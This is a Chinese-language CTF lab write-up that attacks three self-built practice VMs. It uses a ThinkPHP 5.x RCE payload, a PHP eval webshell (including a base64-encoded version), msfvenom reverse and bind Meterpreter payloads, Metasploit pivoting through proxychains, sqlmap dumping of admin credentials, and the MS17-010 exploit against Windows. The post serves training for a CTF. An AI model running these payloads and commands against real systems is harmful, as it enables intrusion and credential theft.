> 原文链接: https://www.anquanke.com//post/id/187908 


# CFS三层靶机搭建及其内网渗透附靶场环境


                                阅读量   
                                **920666**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">17</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p0.ssl.qhimg.com/t01b3c8875a4b68e494.png)](https://p0.ssl.qhimg.com/t01b3c8875a4b68e494.png)



## 0x00 前言

最近要参加的一场CTF线下赛采用了CFS靶场模式，听官方说CFS靶场就是三层靶机的内网渗透，通过一层一层的渗透，获取每个靶机的flag进行拿分，那么先自己搭建一个练练手吧，三层靶机的OVA文件下载地址可以在我的公众号“TeamsSix”回复“CFS”以获取。

在这三台主机中，每台我都放了多个flag，本文将只讲述每个靶机的攻击过程，对于flag的获取不做讨论，这点需要读者自己动手找到这些flag，如果你想知道自己找到的flag是否正确且齐全，同样可以在我的公众号“TeamsSix”回复“flag”以获取。



## 0x01 环境搭建

简单对主机搭建的环境画了个网络拓扑，攻击机的网段在192.168.1.1/24，三台靶机的IP地址分别如图 1所示。  图 1

[![](https://p0.ssl.qhimg.com/t01c886604841bfb052.png)](https://p0.ssl.qhimg.com/t01c886604841bfb052.png)

Vmware的3个网卡分别配置为桥接，仅主机和仅主机，具体子网地址如图 2所示。  图 2

[![](https://p2.ssl.qhimg.com/t010181bf55afbdb34b.png)](https://p2.ssl.qhimg.com/t010181bf55afbdb34b.png)

如果你想在自己的电脑上搭建此靶场的话，需要先将自己Vmware中的虚拟网络编辑器编辑成图 2的样子，之后将三个靶机的OVA文件导入到自己的VMware中即可，这三个虚拟机的IP地址我都已经手动分配成了图 1的样子。

注意：这里桥接模式的网卡设置成自己能联网的网卡即可，因为我发现设置成自动有时会存在虚拟机连不上外网的情况。



## 0x02 Target1

### <a name="header-n11"></a>a、获取shell

1、先用nmap扫描一下Target1

root@kali:~# nmap -T4 -O 192.168.1.11<br>
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-04 05:51 EDT<br>
Nmap scan report for 192.168.1.11<br>
Host is up (0.00042s latency).<br>
Not shown: 994 filtered ports<br>
PORT     STATE  SERVICE<br>
20/tcp   closed ftp-data<br>
21/tcp   open   ftp<br>
22/tcp   open   ssh<br>
80/tcp   open   http<br>
888/tcp  open   accessbuilder<br>
8888/tcp open   sun-answerbook<br>
MAC Address: 00:0C:29:81:A6:6D (VMware)<br>
Device type: general purpose<br>
Running: Linux 3.X|4.X<br>
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4<br>
OS details: Linux 3.10 – 4.11<br>
Network Distance: 1 hop

OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>
Nmap done: 1 IP address (1 host up) scanned in 8.97 seconds

可以看到Target1存在ftp、ssh、http等端口，且是一个Linux的操作系统。

2、既然存在http服务，那就用浏览器打开看看是个什么

[![](https://p1.ssl.qhimg.com/t01a331945117925158.png)](https://p1.ssl.qhimg.com/t01a331945117925158.png)

3、原来是ThinkPHP 5.X框架，这不禁让我想到18年底爆出的该框架的远程命令执行漏洞，那就先用POC测试一下

/index.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1

[![](https://p2.ssl.qhimg.com/t01eeca0d4f6609184a.png)](https://p2.ssl.qhimg.com/t01eeca0d4f6609184a.png)

4、成功出现了PHPinfo界面，说明该版本是存在这在漏洞的，接下来就可以直接上工具写入一句话了，当然也可以使用POC写入一句话，不过还是工具方便些

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t0173ab29786b204b3f.png)

5、在工具中命令是可以被执行的，那就getshell吧

[![](https://p4.ssl.qhimg.com/t01398d43fb426830d3.png)](https://p4.ssl.qhimg.com/t01398d43fb426830d3.png)

6、昂~ getshell失败，没关系，直接echo写入一句话

echo “&lt;?php @eval($_POST[‘TeamsSix’]);?&gt;” &gt; shell.php

[![](https://p2.ssl.qhimg.com/t01fdede825e363f787.png)](https://p2.ssl.qhimg.com/t01fdede825e363f787.png)

7、通过浏览器访问，查看shell.php是否上传成功

[![](https://p3.ssl.qhimg.com/t01235fbc721c5f146d.png)](https://p3.ssl.qhimg.com/t01235fbc721c5f146d.png)

[![](https://p3.ssl.qhimg.com/t013be8d065b7bc8561.png)](https://p3.ssl.qhimg.com/t013be8d065b7bc8561.png)

8、可以看到shell.php已经被上传上去了，但是提示语法错误，同时蚁剑也返回数据为空，看来一句话上传的有点问题，那就cat查看一下

[![](https://p0.ssl.qhimg.com/t0145d034080a5494b7.png)](https://p0.ssl.qhimg.com/t0145d034080a5494b7.png)

之前：&lt;?php @eval($_POST[‘TeamsSix’]);?&gt;<br>
之后：&lt;?php @eval([‘TeamsSix’]);?&gt;

9、不难发现$_POST被过滤了，那就利用Base64编码后再次上传试试

[![](https://p2.ssl.qhimg.com/t015d624017da1c9bec.png)](https://p2.ssl.qhimg.com/t015d624017da1c9bec.png)

[![](https://p5.ssl.qhimg.com/t01cbaba63d1b89d714.png)](https://p5.ssl.qhimg.com/t01cbaba63d1b89d714.png)

[![](https://p0.ssl.qhimg.com/t01feea620face3cfe5.png)](https://p0.ssl.qhimg.com/t01feea620face3cfe5.png)

echo “PD9waHAgQGV2YWwoJF9QT1NUWydUZWFtc1NpeCddKTs/Pg==” | base64 -d &gt; shell.php

10、此时可以看到一句话已经正常，蚁剑也能够连接成功，此时已经获取到该主机的shell，下一步添加代理

[![](https://p5.ssl.qhimg.com/t015dbc219c259b6086.png)](https://p5.ssl.qhimg.com/t015dbc219c259b6086.png)

### <a name="header-n24"></a>b、设置代理

注：本文中设置代理的方法参考安全客里面tinyfisher用户的一篇文章，其文章地址在本文末尾参考文章处。

1、查看自己的IP地址，并根据自己的IP地址及目标靶机的系统类型生成对应的后门文件

root@kali:~# ifconfig<br>
root@kali:~# msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.113 LPORT=6666 SessionCommunicationTimeout=0 SessionExpirationTimeout=0 -f elf &gt;shell.elf

[![](https://p1.ssl.qhimg.com/t011319aea1c0d7af81.png)](https://p1.ssl.qhimg.com/t011319aea1c0d7af81.png)

2、在kali中配置运行监听模块

root@kali:~# msfconsole<br>
msf5 &gt; use exploit/multi/handler<br>
msf5 exploit(multi/handler) &gt; set payload linux/x64/meterpreter/reverse_tcp<br>
msf5 exploit(multi/handler) &gt; set lhost 0.0.0.0<br>
msf5 exploit(multi/handler) &gt; set lport 6666<br>
msf5 exploit(multi/handler) &gt; options<br>
msf5 exploit(multi/handler) &gt; run

[![](https://p3.ssl.qhimg.com/t01913a97effbb957e9.png)](https://p3.ssl.qhimg.com/t01913a97effbb957e9.png)

3、通过蚁剑将shell.elf文件上传到Target1中，并赋予777权限以执行

(www:/www/wwwroot/ThinkPHP/public) $ chmod 777 shell.elf<br>
(www:/www/wwwroot/ThinkPHP/public) $ ./shell.elf

[![](https://p2.ssl.qhimg.com/t016c0f847ee4b6494a.png)](https://p2.ssl.qhimg.com/t016c0f847ee4b6494a.png)

4、此时MSF获取到shell，通过meterpreter添加第二层的路由

run autoroute -s 192.168.22.0/24<br>
run autoroute -p

这一步也可以使用run post/multi/manage/autoroute自动添加路由

[![](https://p2.ssl.qhimg.com/t0109362f1c35dfd464.png)](https://p2.ssl.qhimg.com/t0109362f1c35dfd464.png)

5、在MSF中添加代理，以便让攻击机访问靶机2，经过多次测试，发现MSF使用socks5代理总是失败，因此这里还是采用了socks4

msf5 &gt; use auxiliary/server/socks4a<br>
msf5 auxiliary(server/socks4a) &gt; set srvport 2222<br>
msf5 auxiliary(server/socks4a) &gt; options<br>
msf5 auxiliary(server/socks4a) &gt; run

[![](https://p3.ssl.qhimg.com/t0112aa0b620e92b559.png)](https://p3.ssl.qhimg.com/t0112aa0b620e92b559.png)

6、修改proxychains-ng的配置文件，这里也可以使用proxychains进行代理，不过前者是后者的升级版，因此这里使用proxychains-ng进行代理

root@kali:~# vim /etc/proxychains.conf<br>
加入以下内容：<br>
socks4     192.168.1.113     2222

7、尝试扫描靶机2，该步骤如果一直提示超时，可以把MSF退出再重新配置

root@kali:~# proxychains4 nmap -Pn -sT 192.168.22.22<br>
-Pn：扫描主机检测其是否受到数据包过滤软件或防火墙的保护。<br>
-sT：扫描TCP数据包已建立的连接connect

[![](https://p5.ssl.qhimg.com/t010fdafcb53cdbe8b2.png)](https://p5.ssl.qhimg.com/t010fdafcb53cdbe8b2.png)



## 0x03 Target2

### <a name="header-n43"></a>a、获取shell

1、上一步发现存在80端口，因此我们设置好浏览器代理后，打开看看

[![](https://p2.ssl.qhimg.com/t0139f0d222601112f3.png)](https://p2.ssl.qhimg.com/t0139f0d222601112f3.png)

[![](https://p5.ssl.qhimg.com/t0168dda723a0f5070d.png)](https://p5.ssl.qhimg.com/t0168dda723a0f5070d.png)

2、拿到站点后，经过简单的信息收集，不难找到robots.txt文件中隐藏的后台地址以及主页源码中给的提示

[![](https://p2.ssl.qhimg.com/t01e439b28f5c30a5a5.png)](https://p2.ssl.qhimg.com/t01e439b28f5c30a5a5.png)

[![](https://p2.ssl.qhimg.com/t01ce6e9a23460e7c78.png)](https://p2.ssl.qhimg.com/t01ce6e9a23460e7c78.png)

[![](https://p4.ssl.qhimg.com/t01445db9733933faba.png)](https://p4.ssl.qhimg.com/t01445db9733933faba.png)

3、目前为止，步骤就很鲜明了，利用SQL注入找到后台管理员账号密码，那就用sqlmap开整吧

[![](https://p4.ssl.qhimg.com/t015f2430958790f37a.png)](https://p4.ssl.qhimg.com/t015f2430958790f37a.png)

root@kali:~# proxychains4 sqlmap -u “http://192.168.22.22/index.php?r=vul&amp;keyword=1” -p keyword

4、已经发现了此站点的数据库为MySQL，使用的Nginx和php，接下来找库

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01f0c48e811cf2d735.png)

root@kali:~# proxychains4 sqlmap -u “http://192.168.22.22/index.php?r=vul&amp;keyword=1” -p keyword –dbs

5、看看bagecms下有哪些表

root@kali:~# proxychains4 sqlmap -u “http://192.168.22.22/index.php?r=vul&amp;keyword=1” -p keyword -D bagecms –tables

[![](https://p0.ssl.qhimg.com/t01d67d3e50db4d0e6a.png)](https://p0.ssl.qhimg.com/t01d67d3e50db4d0e6a.png)

6、看一下bage_admin下的内容

root@kali:~# proxychains4 sqlmap -u “http://192.168.22.22/index.php?r=vul&amp;keyword=1” -p keyword -D bagecms -T bage_admin –columns

[![](https://p5.ssl.qhimg.com/t0196d9f5be600ff97e.png)](https://p5.ssl.qhimg.com/t0196d9f5be600ff97e.png)

7、username、password自然是最感兴趣的啦，给它dump下来，在dump的过程中sqlmap会有一些提示，一路yes就行

[![](https://p4.ssl.qhimg.com/t013b27d531cb0ffd36.png)](https://p4.ssl.qhimg.com/t013b27d531cb0ffd36.png)

root@kali:~# proxychains4 sqlmap -u “http://192.168.22.22/index.php?r=vul&amp;keyword=1” -p keyword -D bagecms -T bage_admin -C username,password –dump

8、找到我们想要的了，登陆后台，看看有哪些功能

[![](https://p1.ssl.qhimg.com/t011f255cfc3210cd5d.png)](https://p1.ssl.qhimg.com/t011f255cfc3210cd5d.png)

9、后台里面有文件上传的地方，有编辑主页文件的地方，为了方便，我们直接把一句话写入网站文件中

[![](https://p5.ssl.qhimg.com/t01cb6e3d34446bc23b.png)](https://p5.ssl.qhimg.com/t01cb6e3d34446bc23b.png)

[![](https://p5.ssl.qhimg.com/t014eae0a26305c8794.png)](https://p5.ssl.qhimg.com/t014eae0a26305c8794.png)

10、来到标签页，可以看到一句话生效了，接下里在SocksCap中打开蚁剑，利用蚁剑连接，注意SocksCap设置好代理

[![](https://p4.ssl.qhimg.com/t014569113bf63de374.png)](https://p4.ssl.qhimg.com/t014569113bf63de374.png)

[![](https://p4.ssl.qhimg.com/t01a04a140d1e2ece0b.png)](https://p4.ssl.qhimg.com/t01a04a140d1e2ece0b.png)

### <a name="header-n55"></a>b、设置代理

1、蚁剑中可以看到这是一个64位的linux系统，据此信息在MSF中生成后门

root@kali:~# msfvenom -p linux/x64/meterpreter/bind_tcp LPORT=4321 -f elf &gt; shell2.elf

[![](https://p2.ssl.qhimg.com/t01ba13743ab02ca312.png)](https://p2.ssl.qhimg.com/t01ba13743ab02ca312.png)

2、利用蚁剑将shell2.elf上传到Target2并开启监听

(www:/www/wwwroot/upload) $ chmod 777 shell2.elf<br>
(www:/www/wwwroot/upload) $ ./shell2.elf

[![](https://p4.ssl.qhimg.com/t01662b5d81e41d4a38.png)](https://p4.ssl.qhimg.com/t01662b5d81e41d4a38.png)

3、在MSF中开启EXP，与Target2建立连接，这里需要注意，上一次代理使用的reversetcp是MSF作为监听，让Target1连到我们，而这次代理使用的bindtcp是Target2作为监听，我们需要连到Target2，这个逻辑正好是相反的。

msf5 &gt; use exploit/multi/handler<br>
msf5 exploit(multi/handler) &gt; set payload linux/x64/meterpreter/bind_tcp<br>
msf5 exploit(multi/handler) &gt; set RHOST 192.168.22.22<br>
msf5 exploit(multi/handler) &gt; set LPORT 4321<br>
msf5 exploit(multi/handler) &gt; options<br>
msf5 exploit(multi/handler) &gt; run

[![](https://p0.ssl.qhimg.com/t011c7788b162a64a26.png)](https://p0.ssl.qhimg.com/t011c7788b162a64a26.png)

4、与之前一样，我们添加Target3的路由，这里就不用设置代理了，直接添加路由即可

[![](https://p1.ssl.qhimg.com/t015fce46ce297ea43f.png)](https://p1.ssl.qhimg.com/t015fce46ce297ea43f.png)

run autoroute -s 192.168.33.0/24<br>
run autoroute -p

5、尝试扫描Target3

root@kali:~# proxychains4 nmap -Pn -sT 192.168.33.33

[![](https://p0.ssl.qhimg.com/t0129fdd631777b5b30.png)](https://p0.ssl.qhimg.com/t0129fdd631777b5b30.png)



## 0x03 Target3

### <a name="header-n69"></a>a、获取shell

1、从扫描的结果来看，不难看出这是一个开放着445、3389端口的Windows系统，那就先用永恒之蓝攻击试试

msf5 &gt; use exploit/windows/smb/ms17_010_psexec<br>
msf5 exploit(windows/smb/ms17_010_psexec) &gt; set payload windows/meterpreter/bind_tcp<br>
msf5 exploit(windows/smb/ms17_010_psexec) &gt; set RHOST 192.168.33.33<br>
msf5 exploit(windows/smb/ms17_010_psexec) &gt; options<br>
msf5 exploit(windows/smb/ms17_010_psexec) &gt; run

[![](https://p5.ssl.qhimg.com/t017c00cab90e004033.png)](https://p5.ssl.qhimg.com/t017c00cab90e004033.png)

2、查看账户，直接修改账户密码，利用3389连接，注意要在SocksCap中运行连接远程桌面程序

meterpreter &gt; shell<br>
C:\Windows\system32&gt;net user<br>
C:\Windows\system32&gt;net user Administrator 123

[![](https://p5.ssl.qhimg.com/t01ed5f49d8f42e0408.png)](https://p5.ssl.qhimg.com/t01ed5f49d8f42e0408.png)



## 0x04 总结

到目前为止，三台靶机都已经拿下，这里推荐读者能够自己亲手尝试，找到里面的flag，其中所有flag的找寻方式，会在我的公众号“TeamsSix”推送，这里只讲述拿下三台靶机的方法。 这次的练习耗费了自己的大量时间，从靶场搭建到获取到第三层靶机的shell，这其中碰到的一些问题及我自己踩过的一些坑记录在下面：

1、蚁剑中查看一些文件会提示权限不足，在meterpreter中可以正常查看 2、蚁剑中在Target2里执行命令或者查看文件时不时会失败，初步判断是因为本地网络代理的原因，多试几次就行，总有一次是成功的 3、MSF中Socks5代理模块使用总是失败，Socks4a模块使用成功 4、MSF中建立的会话总是自动断开，将会话连接的靶机上的防火墙关闭即可 5、MSF中ms17010eternalblue模块利用总是失败，ms17010psexec模块使用成功 6、meterpreter中查看文件的路径和Windows下文件的路径里的“/”是相反的 7、meterpreter中上传文件大小貌似有限制，文件上传到8M左右就会提示失败，因此需要将文件压缩成多个小文件进行上传，同时上传7-zip工具（该工具只有1M大小），再利用7-zip对其解压即可，当然此方法仅适用于Windows，linux上的方法可以自行谷歌

参考文章：

http://zerlong.com/512.html

https://www.anquanke.com/post/id/170649

https://www.anquanke.com/post/id/164525

https://blog.csdn.net/qq_36711453/article/details/84977739

这些文章在很大程度上帮助了我这个菜鸟，在这里向以上文章的作者表示感谢。
